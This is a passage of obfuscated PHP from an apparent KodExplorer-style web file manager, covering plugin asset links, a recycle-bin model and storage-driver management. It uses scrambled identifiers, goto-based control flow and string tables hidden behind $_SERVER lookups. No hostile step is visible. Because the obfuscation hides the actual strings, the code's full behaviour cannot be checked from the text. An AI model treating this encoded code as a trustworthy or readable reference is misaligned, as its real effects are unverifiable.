$eÁÍÎ¦÷ğ = $eÌ‹ÑŸÙš . $dœ²‚¢öà[412] . $E”Ì‡›ÎÎ; if (substr($CĞµï‡ğ, 0, 4) == $dœ²‚¢öà[144] || substr($CĞµï‡ğ, 0, 2) == $dœ²‚¢öà[1153]) { $C¹Øäì­Œ = $CĞµï‡ğ . $dœ²‚¢öà[1370] . $eÁÍÎ¦÷ğ; } else { if ($cÚ®ÉÓäŒ­ == $dœ²‚¢öà[33]) { $C¹Øäì­Œ = $this->pluginHost . $CĞµï‡ğ . $dœ²‚¢öà[1370] . $eÁÍÎ¦÷ğ; } else { if ($cÚ®ÉÓäŒ­ === $dœ²‚¢öà[76]) { $C¹Øäì­Œ = $this->pluginHost . $CĞµï‡ğ; } else { if ($cÚ®ÉÓäŒ­ == $dœ²‚¢öà[1371]) { $C¹Øäì­Œ = STATIC_PATH . $CĞµï‡ğ . $dœ²‚¢öà[1370] . $eÌ‹ÑŸÙš; } else { if ($cÚ®ÉÓäŒ­ == $dœ²‚¢öà[1372]) { $C¹Øäì­Œ = APP_HOST . $dœ²‚¢öà[1373] . $CĞµï‡ğ . $dœ²‚¢öà[1370] . $eÌ‹ÑŸÙš; } else { if (isset($DƒÕ‚Ã¦[$cÚ®ÉÓäŒ­])) { $C¹Øäì­Œ = $DƒÕ‚Ã¦[$cÚ®ÉÓäŒ­] . $CĞµï‡ğ . $dœ²‚¢öà[1370] . $eÁÍÎ¦÷ğ; } } } } } } goto EÆ…‹ªÖæ”; Aî–À‘Ò¿: $dœ²‚¢öà =& $_SERVER[Å¸ş]; $DƒÕ‚Ã¦ = $this->getConfig(); $eÌ‹ÑŸÙš = KOD_VERSION . $dœ²‚¢öà[91] . KOD_VERSION_BUILD; goto e¼Èê†¸„; c¶ã¼‰‡·²: } public function link($D‰È¶¡±ºì = false, $F“ä´Õµˆ” = '') { $e½àÚù¥ˆç =& $_SERVER[Å¸ş]; if (!$D‰È¶¡±ºì) { $this->link($e½àÚù¥ˆç[1374], $e½àÚù¥ˆç[1372]); $this->link($e½àÚù¥ˆç[1375], $e½àÚù¥ˆç[1371]); $this->link($e½àÚù¥ˆç[1376], $e½àÚù¥ˆç[1371]); $this->link($e½àÚù¥ˆç[1377], $e½àÚù¥ˆç[1371]); $this->link($e½àÚù¥ˆç[1378], $e½àÚù¥ˆç[1371]); return; } $dáŸ¿®¿ = $this->url($D‰È¶¡±ºì, $F“ä´Õµˆ”, !1); if (substr($D‰È¶¡±ºì, -3) == $e½àÚù¥ˆç[1379]) { echo $e½àÚù¥ˆç[1380] . $dáŸ¿®¿ . $e½àÚù¥ˆç[1381] . $e½àÚù¥ˆç[217]; } else { if (substr($D‰È¶¡±ºì, -4) == $e½àÚù¥ˆç[1382]) { echo $e½àÚù¥ˆç[1383] . $dáŸ¿®¿ . $e½àÚù¥ˆç[1384] . $e½àÚù¥ˆç[217]; } } } } goto d‘­–»˜ğî; e›‘ìíñ«æ: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\162\x63\145\137\162\145\x63\x79\143\154\x65"; protected $dataAuto = array(array("\143\x72\145\x61\164\x65\124\151\155\145", "\164\151\155\145", "\x69\156\163\145\x72\x74", "\146\165\156\143\x74\x69\x6f\156")); public function listData($B®ÍÑÀ÷ñÈ = false) { $c…¬ºÙÈ†¿ =& $_SERVER[Å¸ş]; $B®ÍÑÀ÷ñÈ = $B®ÍÑÀ÷ñÈ ? $B®ÍÑÀ÷ñÈ : USER_ID; $D¦ã›µø÷Â = $this->where(array($c…¬ºÙÈ†¿[1427] => $B®ÍÑÀ÷ñÈ))->select(); return array_to_keyvalue($D¦ã›µø÷Â, $c…¬ºÙÈ†¿[33], $c…¬ºÙÈ†¿[369]); } public function moveToRecycle($Fìêôİİ‡ï) { goto Bƒ¨‡º›×; F˜©ë”ô¢À: if (!$bİµá¬Ò³— || $bİµá¬Ò³—[$c•² Ã¦Åæ[397]] == $c•² Ã¦Åæ[83]) { return; } $F¹ªƒ¡ë‚ï = array($c•² Ã¦Åæ[383] => $Fìêôİİ‡ï, $c•² Ã¦Åæ[1427] => USER_ID, $c•² Ã¦Åæ[523] => $bİµá¬Ò³—[$c•² Ã¦Åæ[371]], $c•² Ã¦Åæ[524] => $bİµá¬Ò³—[$c•² Ã¦Åæ[458]], $c•² Ã¦Åæ[527] => $bİµá¬Ò³—[$c•² Ã¦Åæ[461]]); $this->add($F¹ªƒ¡ë‚ï); goto cí”„¸»´Ş; Bƒ¨‡º›×: $c•² Ã¦Åæ =& $_SERVER[Å¸ş]; $fó‘µ•§Ÿ = Model($c•² Ã¦Åæ[1115]); $bİµá¬Ò³— = $fó‘µ•§Ÿ->sourceInfo($Fìêôİİ‡ï); goto F˜©ë”ô¢À; cí”„¸»´Ş: $this->recycleMove($Fìêôİİ‡ï, 1); if ($bİµá¬Ò³—[$c•² Ã¦Åæ[370]] == $c•² Ã¦Åæ[83]) { $DÊÍ˜ÃÅ‚Ÿ = array($c•² Ã¦Åæ[527] => array($c•² Ã¦Åæ[485], $bİµá¬Ò³—[$c•² Ã¦Åæ[461]] . $Fìêôİİ‡ï . $c•² Ã¦Åæ[486])); $fó‘µ•§Ÿ->where($DÊÍ˜ÃÅ‚Ÿ)->setField($c•² Ã¦Åæ[397], 1); } goto AÌİğæ©Ïä; AÌİğæ©Ïä: } public function clear() { $this->remove(!1); } public function remove($BŞÌÙå©Æ = false) { goto eÕİê‡¼´¤; eÕİê‡¼´¤: $DàÙÉö–éŠ =& $_SERVER[Å¸ş]; $dİ«ßÉÉÊ = Model($DàÙÉö–éŠ[1115]); $FÀ•×£¿ªÖ = $this->listData(); goto d‘ŞŒÚïÏ”; d‘ŞŒÚïÏ”: $BŞÌÙå©Æ = $BŞÌÙå©Æ === !1 ? !1 : $BŞÌÙå©Æ; $Fí«®Ñ×İ» = array(); foreach ($FÀ•×£¿ªÖ as $f©Í·äì‘) { if ($BŞÌÙå©Æ != !1 && !in_array($f©Í·äì‘, $BŞÌÙå©Æ)) { continue; } $Cˆ’İ‚ „¹ = $dİ«ßÉÉÊ->sourceInfo($f©Í·äì‘); $dİ«ßÉÉÊ->remove($f©Í·äì‘, !1); $C’–Ğ’¡´ = $Cˆ’İ‚ „¹[$DàÙÉö–éŠ[371]] . $DàÙÉö–éŠ[70] . $Cˆ’İ‚ „¹[$DàÙÉö–éŠ[458]]; $Fí«®Ñ×İ»[$C’–Ğ’¡´] = array($DàÙÉö–éŠ[523] => $Cˆ’İ‚ „¹[$DàÙÉö–éŠ[371]], $DàÙÉö–éŠ[458] => $Cˆ’İ‚ „¹[$DàÙÉö–éŠ[458]]); $this->where(array($DàÙÉö–éŠ[369] => $f©Í·äì‘))->delete(); } goto DÀìä¾µ‰–; DÀìä¾µ‰–: foreach ($Fí«®Ñ×İ» as $BÜÕÒØô†­) { $dİ«ßÉÉÊ->targetSpaceUpdate($BÜÕÒØô†­[$DàÙÉö–éŠ[371]], $BÜÕÒØô†­[$DàÙÉö–éŠ[458]]); } goto CÑšÙÍ…åµ; CÑšÙÍ…åµ: } public function restore($C©ó˜Šã· = false) { goto A¼†’’‡¸§; BÍ¥À¥¦‚: $C©ó˜Šã· = $C©ó˜Šã· == !1 ? !1 : $C©ó˜Šã·; if (!$C¨Ÿ¥ùÚ†Ä) { return !0; } $CˆÌÙ“ùÁ¯ = array(); goto C¤¸„¸§±Œ; C¤¸„¸§±Œ: foreach ($C¨Ÿ¥ùÚ†Ä as $AÂÕÒÙ„‘™) { goto e®‘³”‹£–; EœÖŞØÜ¹„: if ($d¾½âëù¦­[$aËÃ´Œò‚ö[397]] == $aËÃ´Œò‚ö[83]) { continue; } $dœ·ÅÇóÍ³->lockMoveStart($AÂÕÒÙ„‘™); $this->recycleMove($AÂÕÒÙ„‘™, 0); goto E‘…É•«÷; e®‘³”‹£–: if ($C©ó˜Šã· != !1 && !in_array($AÂÕÒÙ„‘™, $C©ó˜Šã·)) { continue; } $bÓôß¿‰ë‚ = $dœ·ÅÇóÍ³->sourceInfo($AÂÕÒÙ„‘™); $d¾½âëù¦­ = $dœ·ÅÇóÍ³->sourceInfo($bÓôß¿‰ë‚[$aËÃ´Œò‚ö[463]]); goto EœÖŞØÜ¹„; f‡ŒóôŒô®: $CˆÌÙ“ùÁ¯[] = $bÓôß¿‰ë‚[$aËÃ´Œò‚ö[463]]; if ($bÓôß¿‰ë‚[$aËÃ´Œò‚ö[370]] == $aËÃ´Œò‚ö[83]) { $CˆÌÙ“ùÁ¯[] = $AÂÕÒÙ„‘™; } $dœ·ÅÇóÍ³->lockMoveEnd($AÂÕÒÙ„‘™); goto d±–Û´ïàĞ; E‘…É•«÷: if ($bÓôß¿‰ë‚[$aËÃ´Œò‚ö[370]] == $aËÃ´Œò‚ö[83]) { $e¥‹½–ºô = array($aËÃ´Œò‚ö[527] => array($aËÃ´Œò‚ö[485], $bÓôß¿‰ë‚[$aËÃ´Œò‚ö[461]] . $AÂÕÒÙ„‘™ . $aËÃ´Œò‚ö[486])); $dœ·ÅÇóÍ³->where($e¥‹½–ºô)->setField($aËÃ´Œò‚ö[397], 0); $this->restoreFolderChildren($AÂÕÒÙ„‘™, $C¨Ÿ¥ùÚ†Ä); } $this->where(array($aËÃ´Œò‚ö[369] => $AÂÕÒÙ„‘™))->delete(); $dœ·ÅÇóÍ³->folderSizeReset($bÓôß¿‰ë‚[$aËÃ´Œò‚ö[463]]); goto f‡ŒóôŒô®; d±–Û´ïàĞ: } $dœ·ÅÇóÍ³->updateModifyTime($CˆÌÙ“ùÁ¯); goto câŒÀÕï‹ä; A¼†’’‡¸§: $aËÃ´Œò‚ö =& $_SERVER[Å¸ş]; $dœ·ÅÇóÍ³ = Model($aËÃ´Œò‚ö[1115]); $C¨Ÿ¥ùÚ†Ä = $this->listData(); goto BÍ¥À¥¦‚; câŒÀÕï‹ä: } private function restoreFolderChildren($d‘ê…Âº¹É, $C‡’‰õÀè´) { goto dÃÕŠ”©Ø; bŒÆàèˆ×¦: $AêËâ„ñ²[$A®ìÛŒí¥½[369]][1] = array_unique($AêËâ„ñ²[$A®ìÛŒí¥½[369]][1]); $AêËâ„ñ²[$A®ìÛŒí¥½[911]] = $A®ìÛŒí¥½[2193]; $Fƒã‚ç©ª->where($AêËâ„ñ²)->setField($A®ìÛŒí¥½[397], 1); goto f‰“•¢‡; d­‘â·óš·: foreach ($C‡’‰õÀè´ as $EÂ÷öÙø·) { if ($EÂ÷öÙø· == $d‘ê…Âº¹É) { continue; } if (!$Fƒã‚ç©ª->isParentOf($d‘ê…Âº¹É, $EÂ÷öÙø·)) { continue; } $eç²¼£À¬† = $Fƒã‚ç©ª->sourceInfo($EÂ÷öÙø·); if ($eç²¼£À¬†[$A®ìÛŒí¥½[370]] == $A®ìÛŒí¥½[83]) { $AêËâ„ñ²[] = array($A®ìÛŒí¥½[527] => array($A®ìÛŒí¥½[485], $eç²¼£À¬†[$A®ìÛŒí¥½[461]] . $EÂ÷öÙø· . $A®ìÛŒí¥½[486])); } else { $AêËâ„ñ²[$A®ìÛŒí¥½[369]][1][] = $EÂ÷öÙø·; } } if (!$AêËâ„ñ²[$A®ìÛŒí¥½[369]][1]) { unset($AêËâ„ñ²[$A®ìÛŒí¥½[369]]); } if (!$AêËâ„ñ²) { return; } goto bŒÆàèˆ×¦; dÃÕŠ”©Ø: $A®ìÛŒí¥½ =& $_SERVER[Å¸ş]; $Fƒã‚ç©ª = Model($A®ìÛŒí¥½[1115]); $AêËâ„ñ² = array($A®ìÛŒí¥½[369] => array($A®ìÛŒí¥½[7], array())); goto d­‘â·óš·; f‰“•¢‡: } private function recycleMove($f…¼İÙÁËÚ, $f¬Ûñƒ¤Ë = 1) { $E“ø£ØĞãÜ =& $_SERVER[Å¸ş]; $E ÷Œßê²  = Model($E“ø£ØĞãÜ[1115]); $e‚ µ¶³˜» = Model($E“ø£ØĞãÜ[2394]); $E™…Á¯Ø©® = array($E“ø£ØĞãÜ[369] => $f…¼İÙÁËÚ); if ($f¬Ûñƒ¤Ë) { $E ÷Œßê² ->where($E™…Á¯Ø©®)->setField($E“ø£ØĞãÜ[397], 1); $e‚ µ¶³˜»->eventRecycle($f…¼İÙÁËÚ, $E“ø£ØĞãÜ[2395]); } else { $CïšºåƒÎ = $E ÷Œßê² ->where($E™…Á¯Ø©®)->find(); $c¨ô†¦öêç = $CïšºåƒÎ[$E“ø£ØĞãÜ[370]] == $E“ø£ØĞãÜ[83]; $dÒØ‰¯¨ÌÏ = $E ÷Œßê² ->fileNameAuto($CïšºåƒÎ[$E“ø£ØĞãÜ[463]], $CïšºåƒÎ[$E“ø£ØĞãÜ[28]], REPEAT_RENAME_FOLDER, $c¨ô†¦öêç); if ($dÒØ‰¯¨ÌÏ != $CïšºåƒÎ[$E“ø£ØĞãÜ[28]]) { $E ÷Œßê² ->rename($f…¼İÙÁËÚ, $dÒØ‰¯¨ÌÏ); } $E ÷Œßê² ->where($E™…Á¯Ø©®)->setField($E“ø£ØĞãÜ[397], 0); $e‚ µ¶³˜»->eventRecycle($f…¼İÙÁËÚ, $E“ø£ØĞãÜ[2396]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\x73\x74\157\162\x61\x67\145\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\x73\151\x7a\x65\x4d\141\170", "\x73\171\163\x74\x65\x6d", "\x64\x65\x66\x61\x75\154\164", "\x64\162\x69\x76\145\162", "\143\x6f\x6e\146\151\147"); public function listData($F¬È³´ñº· = false, $dˆÅª¾‹§ = "\155\157\x64\x69\x66\x79\124\151\155\145", $D”ºòÛ°Ú = false) { goto FŸµßÛ“çƒ; FŸµßÛ“çƒ: $D¯ŞÖêÙ…¸ =& $_SERVER[Å¸ş]; $F—çƒ…‰„ = parent::listData($F¬È³´ñº·, $dˆÅª¾‹§, $D”ºòÛ°Ú); if ($F¬È³´ñº·) { return $F—çƒ…‰„; } goto f©¢‰‚ñ‘; F¬Éö½æ: return $F—çƒ…‰„; goto Eˆäé…­šê; f©¢‰‚ñ‘: foreach ($F—çƒ…‰„ as $fìñÀ¡Û× => $f‘®êºâ¦Ì) { unset($F—çƒ…‰„[$fìñÀ¡Û×][$D¯ŞÖêÙ…¸[6]]); $F—çƒ…‰„[$fìñÀ¡Û×][$D¯ŞÖêÙ…¸[2094]] = 0; } $Aöâ‰ÛÏ¾è = array_to_keyvalue($F—çƒ…‰„, $D¯ŞÖêÙ…¸[33], $D¯ŞÖêÙ…¸[367]); $this->_listAppendSize($F—çƒ…‰„, $Aöâ‰ÛÏ¾è); goto F¬Éö½æ; Eˆäé…­šê: } public function _listAppendSize(&$F²ƒ™Ã¥Ïâ, $BœæÀÇöõá) { $e¶ĞÉ¥ÄŒ =& $_SERVER[Å¸ş]; if (!$BœæÀÇöõá) { return; } $BÎœæø· = $e¶ĞÉ¥ÄŒ[2397] . implode($e¶ĞÉ¥ÄŒ[47], $BœæÀÇöõá) . $e¶ĞÉ¥ÄŒ[2398]; $d¢§ˆÁöù = Model($e¶ĞÉ¥ÄŒ[721])->query($BÎœæø·); $d¢§ˆÁöù = array_to_keyvalue($d¢§ˆÁöù, $e¶ĞÉ¥ÄŒ[367], $e¶ĞÉ¥ÄŒ[77]); foreach ($F²ƒ™Ã¥Ïâ as $FƒöÙ·ì§  => $ašÏ†ÑãÀ“) { $F²ƒ™Ã¥Ïâ[$FƒöÙ·ì§ ][$e¶ĞÉ¥ÄŒ[2094]] = isset($d¢§ˆÁöù[$ašÏ†ÑãÀ“[$e¶ĞÉ¥ÄŒ[367]]]) ? $d¢§ˆÁöù[$ašÏ†ÑãÀ“[$e¶ĞÉ¥ÄŒ[367]]] : 0; } } public function getConfig($AÕÔ¸¶«–) { $Aùà×Ê’È = parent::listData($AÕÔ¸¶«–); return json_decode($Aùà×Ê’È[$_SERVER[Å¸ş][6]], !0); } public function update($fÕˆŞ„¡›, $e¶•ñ¸äÁ†) { goto AÈ·ƒ‚÷Î; eâ—®…ğİÁ: $EÑ–áñŞ Á = parent::update($fÕˆŞ„¡›, $e¶•ñ¸äÁ†); if ($EÑ–áñŞ Á && $e¶•ñ¸äÁ†[$F©­öæììÀ[34]]) { foreach ($a™¯éÒŠ–¸ as $dÔœØ¹ˆğÓ) { if ($dÔœØ¹ˆğÓ[$F©­öæììÀ[34]] && $dÔœØ¹ˆğÓ[$F©­öæììÀ[367]] != $fÕˆŞ„¡›) { parent::update($dÔœØ¹ˆğÓ[$F©­öæììÀ[367]], array($F©­öæììÀ[34] => 0)); } } } return $EÑ–áñŞ Á; goto EÚßºËŞğ; F´Æõ¯Àê: if (isset($a™¯éÒŠ–¸[$d¡Ã¢é•·à]) && $a™¯éÒŠ–¸[$d¡Ã¢é•·à][$F©­öæììÀ[367]] != $fÕˆŞ„¡›) { return !1; } if (isset($e¶•ñ¸äÁ†[$F©­öæììÀ[2399]]) && $e¶•ñ¸äÁ†[$F©­öæììÀ[2399]] == $F©­öæììÀ[83]) { $this->checkConfig($e¶•ñ¸äÁ†); } unset($e¶•ñ¸äÁ†[$F©­öæììÀ[2399]]); goto eâ—®…ğİÁ; AÈ·ƒ‚÷Î: $F©­öæììÀ =& $_SERVER[Å¸ş]; $d¡Ã¢é•·à = $e¶•ñ¸äÁ†[$F©­öæììÀ[28]]; $a™¯éÒŠ–¸ = array_to_keyvalue(parent::listData(), $F©­öæììÀ[28]); goto F´Æõ¯Àê; EÚßºËŞğ: } public function add($EàãƒÔ”ˆ) { goto aàö×Ü¦ˆš; aàö×Ü¦ˆš: $eİŞ„¢ï´… =& $_SERVER[Å¸ş]; $AîéèÜ•´É = array_to_keyvalue(parent::listData(), $eİŞ„¢ï´…[28]); if (isset($AîéèÜ•´É[$EàãƒÔ”ˆ[$eİŞ„¢ï´…[28]]])) { return !1; } goto C‰Ÿ×ñÍ‹Á; E›‚ÉÇ˜Ä: return $EÔ††¼î›ã; goto DˆÆÖ‡¾Øí; C‰Ÿ×ñÍ‹Á: $this->checkConfig($EàãƒÔ”ˆ); $EÔ††¼î›ã = parent::insert($EàãƒÔ”ˆ); if ($EÔ††¼î›ã && $EàãƒÔ”ˆ[$eİŞ„¢ï´…[34]]) { foreach ($AîéèÜ•´É as $Dã·Ùµ‡¿Ã) { if ($Dã·Ùµ‡¿Ã[$eİŞ„¢ï´…[34]]) { parent::update($Dã·Ùµ‡¿Ã[$eİŞ„¢ï´…[367]], array($eİŞ„¢ï´…[34] => 0)); } } } goto E›‚ÉÇ˜Ä; DˆÆÖ‡¾Øí: } public function checkConfig(&$e…™ôè÷¹ã) { goto D²–œº¾œ¼; fØˆ‡óÛ‡İ: $CÁÕœ¹ä„Ê = $CÕÊØ›ŒíÖ[71] . $f‹Ú‚ªÌª™; if (!$f‹Ú‚ªÌª™ || !class_exists($CÁÕœ¹ä„Ê)) { write_log(array($CÕÊØ›ŒíÖ[2401], $e…™ôè÷¹ã, get_caller_info()), $CÕÊØ›ŒíÖ[2402]); show_json($CÕÊØ›ŒíÖ[2403], !1, $e…™ôè÷¹ã); } $A²Áˆ÷àæ½ = new $CÁÕœ¹ä„Ê($fÂˆŒŞªİ); goto aÑ¡‘‚ÛöÙ; aÑ¡‘‚ÛöÙ: if (in_array($bù¨£¢™Ü¶, $A²Áˆ÷àæ½->objectDriver)) { if (!$A²Áˆ÷àæ½->isBucketCors() && !$A²Áˆ÷àæ½->setBucketCors()) { $D¸½¹ÜŞŸ = LNG($CÕÊØ›ŒíÖ[2404]); $D¸½¹ÜŞŸ .= $CÕÊØ›ŒíÖ[2405] . LNG($CÕÊØ›ŒíÖ[2406]); show_json($D¸½¹ÜŞŸ, !1); } } $DñŒÕà•Ä = rtrim($fÂˆŒŞªİ[$CÕÊØ›ŒíÖ[1022]], $CÕÊØ›ŒíÖ[8]) . $CÕÊØ›ŒíÖ[8]; $e Ş£Ş×óØ = $A²Áˆ÷àæ½->getPath($DñŒÕà•Ä . $CÕÊØ›ŒíÖ[1989]); goto fÅ¨ãàò¶“; fëƒˆÕ´¥ï: $e…™ôè÷¹ã[$CÕÊØ›ŒíÖ[90]] = $f‹Ú‚ªÌª™; return !0; goto fÊ§¹ÖÖ; fÅ¨ãàò¶“: if (!$A²Áˆ÷àæ½->mkfile($e Ş£Ş×óØ)) { show_json(LNG($CÕÊØ›ŒíÖ[2404]), !1); } $fÂˆŒŞªİ[$CÕÊØ›ŒíÖ[1022]] = $DñŒÕà•Ä; $e…™ôè÷¹ã[$CÕÊØ›ŒíÖ[6]] = json_encode($fÂˆŒŞªİ); goto fëƒˆÕ´¥ï; cÉÚ—˜àÍ: foreach ($fÂˆŒŞªİ as $Cğ¸ÈôÄá => $Dè¶ÊìÓ´Í) { $fÂˆŒŞªİ[$Cğ¸ÈôÄá] = trim($Dè¶ÊìÓ´Í); } $fÂˆŒŞªİ[$CÕÊØ›ŒíÖ[2400]] = rand_string(6); $f‹Ú‚ªÌª™ = $this->driverType($bù¨£¢™Ü¶); goto fØˆ‡óÛ‡İ; D²–œº¾œ¼: $CÕÊØ›ŒíÖ =& $_SERVER[Å¸ş]; $bù¨£¢™Ü¶ = strtolower($e…™ôè÷¹ã[$CÕÊØ›ŒíÖ[90]]); $fÂˆŒŞªİ = json_decode($e…™ôè÷¹ã[$CÕÊØ›ŒíÖ[6]], !0); goto cÉÚ—˜àÍ; fÊ§¹ÖÖ: } private function driverType($e£ñ¼î×é) { $b‚íƒ¹…º =& $_SERVER[Å¸ş]; $c‡Ä¾ß¼ = array($b‚íƒ¹…º[102] => $b‚íƒ¹…º[2407], $b‚íƒ¹…º[58] => $b‚íƒ¹…º[2408], $b‚íƒ¹…º[64] => $b‚íƒ¹…º[2409]); if (isset($c‡Ä¾ß¼[$e£ñ¼î×é])) { return $c‡Ä¾ß¼[$e£ñ¼î×é]; } return strtoupper($e£ñ¼î×é); } public function driverListSystem() { $A£æ¬ÜùÀâ =& $_SERVER[Å¸ş]; $Aæ©í”Ü®  = parent::listData(); $CÖ­İµ–¦ = array(); foreach ($Aæ©í”Ü®  as $e…«º‹øµ¢) { unset($e…«º‹øµ¢[$A£æ¬ÜùÀâ[187]], $e…«º‹øµ¢[$A£æ¬ÜùÀâ[107]]); $e…«º‹øµ¢[$A£æ¬ÜùÀâ[6]] = json_decode($e…«º‹øµ¢[$A£æ¬ÜùÀâ[6]], !0); $CÖ­İµ–¦[] = $e…«º‹øµ¢; } return $CÖ­İµ–¦; } public function defaultDriver() { $A¨æ‡›ÌË =& $_SERVER[Å¸ş]; $bÕ“ò œ‹ = parent::listData(); $C”ÆË‘ ĞÉ = array_filter_by_field($bÕ“ò œ‹, $A¨æ‡›ÌË[34], 1); $C”ÆË‘ ĞÉ = $C”ÆË‘ ĞÉ[0]; if ($C”ÆË‘ ĞÉ) { $C”ÆË‘ ĞÉ[$A¨æ‡›ÌË[6]] = json_decode($C”ÆË‘ ĞÉ[$A¨æ‡›ÌË[6]], !0); } return $C”ÆË‘ ĞÉ; } public function driverInfo($CùŸÉ²ß´É) { $Eİ¦‚Ë–ËŞ =& $_SERVER[Å¸ş]; $CêÏ–Ç×Ú¿ = array_to_keyvalue(parent::listData(), $Eİ¦‚Ë–ËŞ[367]); if (!isset($CêÏ–Ç×Ú¿[$CùŸÉ²ß´É])) { return !1; } $Dˆ¯é­ĞĞ = $CêÏ–Ç×Ú¿[$CùŸÉ²ß´É]; $Dˆ¯é­ĞĞ[$Eİ¦‚Ë–ËŞ[6]] = json_decode($Dˆ¯é­ĞĞ[$Eİ¦‚Ë–ËŞ[6]], !0); return $Dˆ¯é­ĞĞ; } public function remove($AÎ˜Ä¼ª¿ö) { $this->removeShareItems($AÎ˜Ä¼ª¿ö); return parent::remove($AÎ˜Ä¼ª¿ö); } public function removeWithFile($a İåÔè˜İ) { goto BÊøÛŒ; e‹æ¢‹¬Ä: $AÚÜí©ä¯· = "\x7b\151\157\72{$Eİœ£Ä‰Ãç}\175\x2f"; $B§ÑŞÛ £ = !0; $fÌİÏÒ’ = array(); goto c¼İ³ˆ™Ğ’; c‹ÊÊ‡’: $aœí¢íÊ = Model($c¯Ø¨Ââ»Ã[422])->where($aºîæñÒƒ·)->sum($c¯Ø¨Ââ»Ã[77]); $dèòæŠ˜ø‘ = $c¯Ø¨Ââ»Ã[2410] . $a İåÔè˜İ; $fØ¬çÓ„ë¥ = new TaskFileTransfer($dèòæŠ˜ø‘, $c¯Ø¨Ââ»Ã[2402], $DÙ»£Ïáõ­, LNG($c¯Ø¨Ââ»Ã[2411]) . "\x28{$a İåÔè˜İ}\51"); goto CİËÙô‘’†; b›ªĞÍ´¬é: if (!$B§ÑŞÛ £) { $fØ¬çÓ„ë¥->stop($dèòæŠ˜ø‘); return !1; } $fØ¬çÓ„ë¥->end(); $this->remove($a İåÔè˜İ); goto aœğöÕÖ…Ì; BÊøÛŒ: $c¯Ø¨Ââ»Ã =& $_SERVER[Å¸ş]; $aºîæñÒƒ· = array($c¯Ø¨Ââ»Ã[746] => $a İåÔè˜İ); $DÙ»£Ïáõ­ = Model($c¯Ø¨Ââ»Ã[422])->where($aºîæñÒƒ·)->count(); goto c‹ÊÊ‡’; c¼İ³ˆ™Ğ’: $fñä‚íİ²ì = Model($c¯Ø¨Ââ»Ã[167])->where($aºîæñÒƒ·)->field($c¯Ø¨Ââ»Ã[2412])->select(); foreach ($fñä‚íİ²ì as $AáÕÛ¹ù¡) { goto d¹‡Ö…ªİÁ; d¹‡Ö…ªİÁ: $cÓÜĞéŠ›œ = $AáÕÛ¹ù¡[$c¯Ø¨Ââ»Ã[75]]; $d¾ë ÚèÖ = $AÚÜí©ä¯· . str_replace("\173\151\157\x3a{$a İåÔè˜İ}\175\x2f", $c¯Ø¨Ââ»Ã[33], $cÓÜĞéŠ›œ); if (!IO::exist($cÓÜĞéŠ›œ)) { $fÌİÏÒ’[] = $AáÕÛ¹ù¡[$c¯Ø¨Ââ»Ã[419]]; $fØ¬çÓ„ë¥->updateFileEnd($AáÕÛ¹ù¡[$c¯Ø¨Ââ»Ã[28]], $AáÕÛ¹ù¡[$c¯Ø¨Ââ»Ã[77]]); continue; } goto DÑµ¸Ì¸ŒŒ; DÑµ¸Ì¸ŒŒ: if (IO::exist($d¾ë ÚèÖ)) { $fØ¬çÓ„ë¥->updateFileEnd($AáÕÛ¹ù¡[$c¯Ø¨Ââ»Ã[28]], $AáÕÛ¹ù¡[$c¯Ø¨Ââ»Ã[77]]); continue; } if (!IO::move($cÓÜĞéŠ›œ, get_path_father($d¾ë ÚèÖ))) { $B§ÑŞÛ £ = !1; break; } $aºîæñÒƒ· = array($c¯Ø¨Ââ»Ã[419] => $AáÕÛ¹ù¡[$c¯Ø¨Ââ»Ã[419]]); goto EÃì½ÃŞ–¼; EÃì½ÃŞ–¼: $F­øÆÎà¯ = array($c¯Ø¨Ââ»Ã[746] => $Eİœ£Ä‰Ãç, $c¯Ø¨Ââ»Ã[75] => $d¾ë ÚèÖ); Model($c¯Ø¨Ââ»Ã[167])->where($aºîæñÒƒ·)->save($F­øÆÎà¯); goto e®ËÉ·†È«; e®ËÉ·†È«: } $this->removeByFileID($fÌİÏÒ’); goto b›ªĞÍ´¬é; CİËÙô‘’†: $fØ¬çÓ„ë¥->task[$c¯Ø¨Ââ»Ã[701]] = (double) $aœí¢íÊ; $fÕ«—¡“Ãğ = KodIO::defaultDriver(); $Eİœ£Ä‰Ãç = $fÕ«—¡“Ãğ[$c¯Ø¨Ââ»Ã[367]]; goto e‹æ¢‹¬Ä; aœğöÕÖ…Ì: } public function progress($E‹“Øí–¯) { return Task::get($_SERVER[Å¸ş][2410] . $E‹“Øí–¯); } private function removeByFileID($A„‰Éß§Ğ = array()) { goto d…‹†ÙÏĞÆ; cêã“„¼…: $Aø©´¨…À = Model($A‚ËÊ‘¯­©[1115])->where($cÎ¶Æ»´Ÿ)->field($A‚ËÊ‘¯­©[369])->select(); if (!$Aø©´¨…À) { return; } $Aø©´¨…À = array_to_keyvalue($Aø©´¨…À, $A‚ËÊ‘¯­©[33], $A‚ËÊ‘¯­©[369]); goto EÁÂ‰Ëô¶‚; EÁÂ‰Ëô¶‚: foreach ($Aø©´¨…À as $Fò‡¥İÔ¢ø) { Model($A‚ËÊ‘¯­©[382])->removeNow($Fò‡¥İÔ¢ø, !1); } goto D‹ŠôŸöÓ; d…‹†ÙÏĞÆ: $A‚ËÊ‘¯­© =& $_SERVER[Å¸ş]; if (empty($A„‰Éß§Ğ)) { return; } $cÎ¶Æ»´Ÿ = array($A‚ËÊ‘¯­©[419] => array($A‚ËÊ‘¯­©[7], $A„‰Éß§Ğ)); goto cêã“„¼…; D‹ŠôŸöÓ: } private function removeShareItems($F®’Æ¢»Ù…) { goto D¥Ø¥’•âº; f ÏÒÏ¥Êâ: $E£ÓÕ÷Û = Model($BÓ‰ó‚ÔÇŸ[2085])->where($cƒòñ—ÜÄ™)->field($BÓ‰ó‚ÔÇŸ[441])->select(); if (empty($E£ÓÕ÷Û)) { return; } $a‘¾š…‡‚ = array_to_keyvalue($E£ÓÕ÷Û, $BÓ‰ó‚ÔÇŸ[33], $BÓ‰ó‚ÔÇŸ[441]); goto dŒêëæˆÉ; D¥Ø¥’•âº: $BÓ‰ó‚ÔÇŸ =& $_SERVER[Å¸ş]; $cë‚ÚÊæŞ = "\173\x69\157\72{$F®’Æ¢»Ù…}\x7d\57"; $cƒòñ—ÜÄ™ = array($BÓ‰ó‚ÔÇŸ[369] => 0, $BÓ‰ó‚ÔÇŸ[1017] => array($BÓ‰ó‚ÔÇŸ[754], "{$cë‚ÚÊæŞ}\45")); goto f ÏÒÏ¥Êâ; dŒêëæˆÉ: 